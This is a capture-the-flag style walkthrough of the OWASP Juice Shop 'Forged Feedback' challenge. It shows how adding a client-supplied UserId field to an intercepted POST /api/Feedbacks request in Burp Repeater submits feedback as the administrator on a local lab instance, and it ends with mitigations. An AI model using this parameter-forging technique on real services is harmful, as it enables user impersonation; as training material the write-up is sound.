# Forged Feedback Challenge

| Item | Detail |
|---|---|
| Category | Broken Access Control |
| Difficulty | Hard (3-Star) |
| Juice Shop Flag | `score-board#Forged Feedback` |
| Tools Used | Burp Suite (Proxy / Repeater) |
| Status | Solved |

---

## 1. Vulnerability Explanation

The application allows users to submit customer feedback through:

```text
POST /api/Feedbacks
```

However, the backend does not properly verify the identity of the submitting user.

Instead of deriving the user identity from the authenticated session, the server trusts user-controlled fields such as:

```text
UserId
```

This allows attackers to submit feedback on behalf of other users.

This challenge is rated **3 stars** because it requires:

- Understanding the API structure  
- Intercepting and modifying requests with Burp Suite  
- Knowing the correct parameter name and a valid target user ID  

---

## 2. Security Impact

- Impersonation of other users (horizontal privilege escalation)  
- Fake feedback under trusted accounts  
- Loss of trust in platform reviews  
- No accountability for malicious submissions  

---

## 3. Step-by-Step Exploitation

### Step 1: Find a target user ID

Navigate to:

```text
/#/administration
```

or inspect existing feedback data.

The administrator account is commonly:

```text
UserId: 1
admin@juice-sh.op
```

### Step 2: Intercept a feedback submission

- Configure browser to use Burp Suite proxy (`127.0.0.1:8080`)  
- Navigate to:

```text
/#/contact
```

- Turn **Intercept ON** in Burp Proxy tab  
- Fill in the feedback form  
- Solve the CAPTCHA  
- Click **Submit**

Captured request:

```http
POST /api/Feedbacks HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"captchaId":42,"captcha":"1234","comment":"Test","rating":3}
```

### Step 3: Modify the request in Repeater

Send the request to **Repeater** (`Ctrl + R`) and add the forged identity field:

```json
{"captchaId":42,"captcha":"1234","comment":"Hacked by Forger!","rating":1,"UserId":1}
```

### Step 4: Send the request

- Click **Send**

Successful response:

```json
{"status":"success","data":{"id":123,"UserId":1,"comment":"Hacked by Forger!","rating":1}}
```

### Step 5: Verify

- Open:

```text
/#/administration
```

- The feedback appears under the forged user's name  
- Check the **Score Board**  
- Challenge is marked as **Solved**

---

## 4. Why This Works

The server fails to enforce ownership and identity checks.

Instead of using the authenticated session or JWT claims, it trusts a client-supplied:

```text
UserId
```

parameter.

This lets attackers impersonate any account.

The challenge is harder because:

- `UserId` must be discovered  
- CAPTCHA must be completed or reused  
- Feedback must successfully appear under the target identity  

---

## 5. Mitigation

- Never trust client-supplied identity fields  
- Derive user identity from authenticated sessions or JWT tokens  
- Verify ownership server-side before processing submissions  
- Ignore unexpected privilege-related parameters in requests  

---

## 6. Key Takeaways

- Always test whether `UserId`, `ownerId`, or similar fields are accepted  
- Burp Repeater is excellent for parameter injection testing  
- This challenge is similar to Forged Review but targets the feedback API with added CAPTCHA complexity  